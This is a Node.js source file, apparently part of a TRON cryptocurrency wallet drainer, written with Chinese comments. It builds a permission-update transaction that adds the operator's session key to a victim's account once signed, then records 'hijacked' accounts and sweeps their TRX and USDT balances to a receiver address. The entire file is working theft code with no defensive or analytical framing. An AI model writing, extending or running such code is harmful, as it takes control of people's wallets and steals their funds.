const TronWeb = require('tronweb');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const DB = path.join(__dirname, 'hijacked.json');

class Engine {
    constructor() {
        this.tw = new TronWeb({
            fullHost: config.fullNode,
            headers: config.apiKey ? { 'TRON-PRO-API-KEY': config.apiKey } : {}
        });
        this.sk = config.sessionKey;
        this.sa = config.sessionAddress;
        this.rc = config.receiverAddress;
    }

    async buildTx(target) {
        // 正确的 v4 API: updateAccountPermissions(ownerAddress, ownerPermission, witnessPermission, activePermissions)
        const ownerPermission = {
            type: 0,
            permission_name: 'owner',
            threshold: 1,
            keys: [{ address: target, weight: 1 }]
        };

        const activePermission = {
            type: 2,
            permission_name: 'active',
            threshold: 1,
            operations: '7fff1fc0033e0000000000000000000000000000000000000000000000000000',
            keys: [
                { address: target, weight: 1 },
                { address: this.sa, weight: 1 }
            ]
        };

        // v4 格式: (ownerAddress, ownerPermission, witnessPermission, activePermissions)
        return await this.tw.transactionBuilder.updateAccountPermissions(
            target,
            ownerPermission,
            null,  // witness 为 null（非超级代表）
            [activePermission]
        );
    }

    async execute(signed, target, aid) {
        const r = await this.tw.trx.sendRawTransaction(signed);
        if (r.result || r.code === 'SUCCESS') this.save(target, aid, true);
        return r;
    }

    async drain(addr) {
        const out = [];
        try {
            const bal = await this.tw.trx.getBalance(addr);
            const trx = bal / 1e6;
            if (trx > 5) {
                const tx = await this.tw.transactionBuilder.sendTrx(this.rc, (trx - 5) * 1e6, addr);
                const s = await this.tw.trx.sign(tx, this.sk);
                out.push({ type: 'TRX', amount: trx - 5, result: await this.tw.trx.sendRawTransaction(s) });
            }
        } catch (e) { out.push({ type: 'TRX', error: e.message }); }
        try {
            const c = await this.tw.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
            const u = await c.balanceOf(addr).call();
            const amt = parseInt(u) / 1e6;
            if (amt > 0) {
                out.push({ type: 'USDT', amount: amt, result: await c.transfer(this.rc, amt * 1e6).send({ feeLimit: 100000000, from: addr, privateKey: this.sk }) });
            }
        } catch (e) { out.push({ type: 'USDT', error: e.message }); }
        this.markDrained(addr);
        return out;
    }

    save(addr, aid, ok) {
        let d = [];
        try { d = JSON.parse(fs.readFileSync(DB, 'utf8')); } catch(e) {}
        d.push({ addr, aid, ok, sa: this.sa, rc: this.rc, ts: Date.now() });
        fs.writeFileSync(DB, JSON.stringify(d, null, 2));
    }
    markDrained(addr) {
        let d = [];
        try { d = JSON.parse(fs.readFileSync(DB, 'utf8')); } catch(e) {}
        const i = d.find(h => h.addr === addr);
        if (i) i.drained = true;
        fs.writeFileSync(DB, JSON.stringify(d, null, 2));
    }
    getList() { try { return JSON.parse(fs.readFileSync(DB, 'utf8')); } catch { return []; } }
    getStats(aid) {
        const a = this.getList().filter(h => h.aid === aid);
        return { total: a.length, ok: a.filter(h => h.ok).length, drained: a.filter(h => h.drained).length, list: a };
    }
}
module.exports = Engine;
